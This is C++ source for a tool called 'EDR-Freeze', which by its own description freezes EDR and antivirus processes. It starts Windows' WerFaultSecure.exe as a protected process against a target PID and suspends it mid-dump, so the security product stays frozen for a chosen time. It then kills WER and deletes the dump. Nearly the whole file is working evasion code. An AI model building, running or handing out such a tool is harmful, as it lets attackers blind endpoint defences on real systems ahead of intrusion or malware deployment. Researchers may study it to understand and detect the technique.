#pragma once
#include <iostream>
#include "ProcessMisc.h"
#include "PPLHelp.h"

struct PauseCheckParams {
    DWORD targetPID;
    DWORD werPID;
};
DWORD WINAPI PauseCheck(LPVOID lpParam) 
{
    PauseCheckParams* params = static_cast<PauseCheckParams*>(lpParam);
    DWORD targetPID = params->targetPID;
    DWORD werPID = params->werPID;
    while (!IsProcessSuspendedByPID(targetPID))
    {
        continue;
    }
    //target paused, now pause WerFault to keep target freeze
    std::wcout << L"Target paused. PID: " << targetPID << std::endl;
    if (SuspendProcessByPID(werPID))
    {
        std::wcout << L"WER paused. PID: " << targetPID << std::endl;
    }
    return 0;
}
BOOL FreezeRun(DWORD targetPID, DWORD targetTID, DWORD sleepTime)
{
    // 1. Prepare SECURITY_ATTRIBUTES for inheritable handles
    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = nullptr;

    // 2. Create the output files for the dumps
    HANDLE hEncDump = CreateFileW(L"t.txt", GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hEncDump == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"Failed to create dump files: " << GetLastError() << std::endl;
        return 0;
    }
    // 3. Create the cancellation event
    HANDLE hCancel = CreateEventW(&sa, TRUE, FALSE, nullptr);
    if (!hCancel)
    {
        std::wcerr << L"Failed to create cancel event: " << GetLastError() << std::endl;
        CloseHandle(hEncDump);
        return 0;
    }
    //
    std::wstring werPath = L"C:\\Windows\\System32\\WerFaultSecure.exe";
    std::wstringstream cmd;
    cmd << werPath
        << L" /h"
        << L" /pid " << targetPID
        << L" /tid " << targetTID
        << L" /encfile " << HandleToDecimal(hEncDump)
        << L" /cancel " << HandleToDecimal(hCancel)
        << L" /type 268310"; // dump full
    std::wstring commandLine = cmd.str();
    PPLProcessCreator creator;
    //0 = WinTCB
    DWORD werPID = creator.CreatePPLProcess(0, commandLine);
    if (werPID == 0)
    {
        std::wcerr << L"Failed to create PPL process." << std::endl;
        CloseHandle(hEncDump);
        CloseHandle(hCancel);
        return 0;
    }

    PauseCheckParams* params = new PauseCheckParams{ targetPID, werPID };
    // Create a thread to check target status
    HANDLE hThread = CreateThread(
        nullptr,               // default security attributes
        0,                     // default stack size
        PauseCheck,            // thread function
        params,                // parameter to thread function
        0,                     // default creation flags
        nullptr                // receive thread identifier
    );
    if (hThread == nullptr) 
    {
        std::wcerr << L"Failed to create thread." << std::endl;
        delete params;
        return 0;
    }
    Sleep(sleepTime);
    //terminate WerFaultSecure, let target auto resume
    if (TerminateProcessByPID(werPID))
    {
        std::wcout << L"Kill WER successfully. PID: " << werPID << std::endl;
    }
    else
    {
        std::wcerr << L"Kill WER failed: " << GetLastError() << std::endl;
    }
    CloseHandle(hThread);
    delete params;
    CloseHandle(hEncDump);
    CloseHandle(hCancel);
    // Delete the useless enc file
    if (DeleteFileW(L"t.txt"))
    {
        std::wcout << L"File deleted successfully." << std::endl;
    }
    else
    {
        std::wcerr << L"Error deleting file: " << GetLastError() << std::endl;
    }
    return 1;
}


int wmain(int argc, wchar_t* argv[])
{
    std::wcout << L"\nEDR-Freeze: Tool that freezes EDR/Antivirus\n"
        << L"  Two Seven One Three: https://x.com/TwoSevenOneT\n"
        << L"==================================================\n\n";

    if (argc != 3)
    {
        std::wcout << L"Usage:\n"
            << L"  EDR-Freeze.exe <TargetPID> <SleepTime>\n\n"
            << L"Example:\n"
            << L"  EDR-Freeze.exe 1234 10000\n"
            << L"  Freeze the target for 10000 milliseconds\n";
        return 0;
    }
    DWORD targetPid = _wtoi(argv[1]);
    DWORD pauseTime = _wtoi(argv[2]);
    if (!EnableDebugPrivilege())
    {
        std::wcerr << L"Failed to enable debug privilege.\n";
        return 0;
    }
    // Get main thread ID
    DWORD targetTid = GetMainThreadId(targetPid);
    if (targetTid == 0)
    {
        std::wcerr << L"Failed to find main thread for PID " << targetPid << L"\n";
        return 0;
    }
    FreezeRun(targetPid, targetTid, pauseTime);

    return 0;
}

